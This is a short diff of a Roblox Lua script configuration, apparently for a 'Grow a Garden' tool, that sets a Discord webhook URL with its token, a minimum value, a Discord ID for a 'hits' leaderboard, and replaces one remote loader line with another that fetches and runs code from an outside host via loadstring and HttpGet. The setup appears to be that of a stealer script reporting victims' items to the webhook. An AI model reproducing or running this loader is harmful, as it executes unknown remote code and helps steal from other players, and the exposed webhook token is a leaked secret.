@@ -3,4 +3,4 @@ Webhook = "https://discord.com/api/webhooks/1404770407042519040/JFQAKLKAuc7-XCz_
 MinimumValue = 1
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
